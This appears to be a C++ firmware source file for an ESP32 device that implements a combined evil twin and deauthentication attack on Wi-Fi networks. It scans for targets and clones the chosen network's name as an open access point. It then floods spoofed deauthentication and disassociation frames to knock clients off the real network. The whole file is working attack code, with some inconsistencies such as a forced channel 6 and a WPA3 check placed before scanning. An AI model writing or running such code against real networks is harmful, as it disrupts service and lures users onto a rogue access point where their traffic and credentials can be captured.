#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <globals.h>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <modules/wifi/sniffer.h>
#include <sstream>

// Evil Twin + Deauth implementation
class EvilTwinDeauth {
private:
    wifi_ap_record_t target_ap;
    bool is_wpa3 = false;
    uint8_t target_channel = 6; // Fixed channel 6
    String target_ssid;

    // Raw deauth frame buffer
    uint8_t deauth_frame[26] = {
        0xc0, 0x00, // Deauth type
        0x00, 0x00, // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest MAC (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src MAC (AP)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Seq
        0x07, 0x00  // Reason: Class 3 frame received from nonassociated STA
    };

    void scan_networks() {
        drawMainBorderWithTitle("Scanning Networks...");
        tft.println("Scanning for targets...");

        wifi_scan_config_t scan_config = {};
        scan_config.show_hidden = false;
        scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;

        esp_wifi_scan_start(&scan_config, true);
        uint16_t ap_count = 0;
        esp_wifi_scan_get_ap_num(&ap_count);

        wifi_ap_record_t *ap_records = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * ap_count);
        esp_wifi_scan_get_ap_records(&ap_count, ap_records);

        // Display found networks
        tft.fillScreen(leleConfig.bgColor);
        drawMainBorderWithTitle("Select Target Network");
        tft.setCursor(0, 30);

        std::vector<wifi_ap_record_t> valid_targets;
        for (int i = 0; i < ap_count; i++) {
            wifi_ap_record_t ap = ap_records[i];

            // Skip WPA3 networks
            if (ap.authmode == WIFI_AUTH_WPA3_PSK ||
                ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK ||
                ap.authmode == WIFI_AUTH_WAPI_PSK) {
                tft.printf("%d. %s - WPA3 (SKIPPED)\n", i+1, ap.ssid);
                is_wpa3 = true;
                continue;
            }

            tft.printf("%d. %s (CH:%d %s)\n", valid_targets.size()+1,
                      ap.ssid, ap.primary, authmode_to_string(ap.authmode));
            valid_targets.push_back(ap);
        }

        if (valid_targets.empty()) {
            displayError("No valid targets found (WPA3 skipped)", true);
            free(ap_records);
            return;
        }

        // Select target
        int choice = keyboard("1", 2, "Enter target number:");
        if (choice < 1 || choice > valid_targets.size()) {
            displayError("Invalid choice", true);
            free(ap_records);
            return;
        }

        target_ap = valid_targets[choice-1];
        target_ssid = String((char*)target_ap.ssid);
        target_channel = 6; // Force channel 6

        free(ap_records);

        tft.println("Target: " + target_ssid);
        tft.println("Channel: " + String(target_channel));
    }

    void start_evil_twin() {
        // Set WIFI_AP_STA mode
        esp_wifi_set_mode(WIFI_MODE_APSTA);

        // Configure AP with same SSID as target
        wifi_config_t ap_config = {};
        strcpy((char*)ap_config.ap.ssid, target_ssid.c_str());
        ap_config.ap.ssid_len = target_ssid.length();
        ap_config.ap.channel = target_channel;
        ap_config.ap.authmode = WIFI_AUTH_OPEN; // Open for evil twin
        ap_config.ap.max_connection = 4;
        ap_config.ap.beacon_interval = 1000; // 1 second beacon interval

        esp_wifi_set_config(WIFI_IF_AP, &ap_config);

        // Disable beacon rate to "disappear" in 1s
        // Note: This is a simplification - actual beacon disabling requires custom firmware mods
        // For now, we'll use rapid beacon changes

        esp_wifi_start();

        tft.println("Evil Twin AP started: " + target_ssid);
        tft.println("Channel: " + String(target_channel));
    }

    void deauth_flood() {
        // Set deauth frame with target AP BSSID
        memcpy(&deauth_frame[10], target_ap.bssid, 6); // BSSID
        memcpy(&deauth_frame[16], target_ap.bssid, 6); // Src MAC as AP

        tft.println("Starting deauth flood...");
        tft.println("Target: " + String((char*)target_ap.bssid, HEX));
        tft.println("Channel: " + String(target_channel));

        long start_time = millis();
        int packet_count = 0;

        while (!check(AnyKeyPress)) {
            // Send 10 packets in burst every 100ms
            for (int i = 0; i < 10; i++) {
                // Send deauth frame using raw TX
                esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

                // Send disassociate frame
                deauth_frame[0] = 0xa0; // Disassociate
                esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
                deauth_frame[0] = 0xc0; // Back to deauth

                packet_count++;
            }

            delay(100); // 100ms between bursts

            // Update counter every second
            if (millis() - start_time > 1000) {
                tft.drawRightString(String(packet_count) + " pkts/s", tftWidth - 12, tftHeight - 16, 1);
                packet_count = 0;
                start_time = millis();
            }
        }
    }

    const char* authmode_to_string(wifi_auth_mode_t authmode) {
        switch (authmode) {
            case WIFI_AUTH_OPEN: return "OPEN";
            case WIFI_AUTH_WEP: return "WEP";
            case WIFI_AUTH_WPA_PSK: return "WPA";
            case WIFI_AUTH_WPA2_PSK: return "WPA2";
            case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
            case WIFI_AUTH_WPA3_PSK: return "WPA3";
            case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
            default: return "UNKNOWN";
        }
    }

public:
    void run() {
        if (is_wpa3) {
            displayError("WPA3? Volta pra casa!", true);
            return;
        }

        scan_networks();
        if (target_ssid.isEmpty()) return;

        start_evil_twin();
        deauth_flood();

        // Cleanup
        esp_wifi_stop();
        wifiDisconnect();
    }
};

// Global function to start Evil Twin + Deauth
void evil_twin_deauth_attack() {
    EvilTwinDeauth attack;
    attack.run();
}
